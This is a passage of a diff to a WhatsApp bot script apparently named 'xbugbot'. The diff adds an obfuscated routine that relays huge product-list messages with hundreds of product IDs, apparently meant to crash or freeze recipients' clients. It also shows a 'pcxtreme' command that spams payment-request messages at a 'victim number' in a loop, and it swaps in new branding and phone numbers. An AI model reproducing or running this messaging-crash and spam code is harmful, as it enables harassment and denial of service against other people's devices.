09)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});XeonBotInc['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
+function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 917736807522@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await XeonBotInc[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});XeonBotInc['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
 }
 }
 break
@@ -7331,7 +7334,7 @@ var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "surface": "CATALOG",
 "message": ownername,
 "orderTitle": wm, // 
-"sellerJid": " 916909137213@s.whatsapp.net",
+"sellerJid": " 917736807522@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
@@ -7342,7 +7345,7 @@ break
 case 'pcxtreme': {
 
                 if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909137213s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 917736807522s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
 num = q.split('|')[0]
 amount = q.split('|')[1]
 for (let i = 0; i < amount; i++) {
@@ -7352,7 +7355,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "INR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+"text": `🐱WH173 5P1D3Rxbugbot`,
 }
 }}), { userJid: m.chat, quoted: doc})
 XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -7432,7 +7435,7 @@ case 'huehuex': {
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-reply(`🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
+reply(`🐱WH173 5P1D3Rxbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
 }
 break
   case 'not_for_use_xxxxxxxxxxxxwkwkwk':{
@@ -7450,12 +7453,12 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`, 
+"caption": `🐱WH173 5P1D3Rxbugbot`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-XeonBotInc.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
+XeonBotInc.sendText(m.chat, `W5 BOT`, text, {quoted: unicornXeonxD})
 }
 }
 break
@@ -7465,7 +7468,7 @@ case 'textshot': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
-                reply(`${m.pushName} Xeon Ezy☣️${text ? ': ' + text : ''}`)
+                reply(`${m.pushName} W5 BOT${text ? ': ' + text : ''}`)
             }
             break
 //------------------------The End----------------------\\
@@ -7544,7 +7547,7 @@ case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
             break
